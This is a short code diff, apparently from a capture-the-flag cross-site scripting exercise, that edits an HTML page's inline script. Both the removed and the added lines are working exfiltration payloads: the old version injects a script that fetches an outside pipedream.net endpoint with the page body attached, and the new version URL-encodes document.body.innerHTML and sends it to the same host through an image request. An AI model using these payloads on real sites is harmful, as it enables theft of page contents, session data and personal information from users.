@@ -8,9 +8,10 @@
 </body>
 <script>
   document.getElementById("getFlag").innerHTML = 'Payload executed';
-  var scriptElement = document.createElement('script');
-  var xssPayload = 'fetch("https://eoue93psy15d0ln.m.pipedream.net?" + document.body.innerHTML)';
-  scriptElement.textContent = xssPayload;
-  document.body.appendChild(scriptElement);
+  var flagData = document.body.innerHTML;
+  var encodedFlagData = encodeURIComponent(flagData);
+  var url = 'https://eoue93psy15d0ln.m.pipedream.net?data=' + encodedFlagData;
+  var img = new Image();
+  img.src = url;
 </script>
 </html>
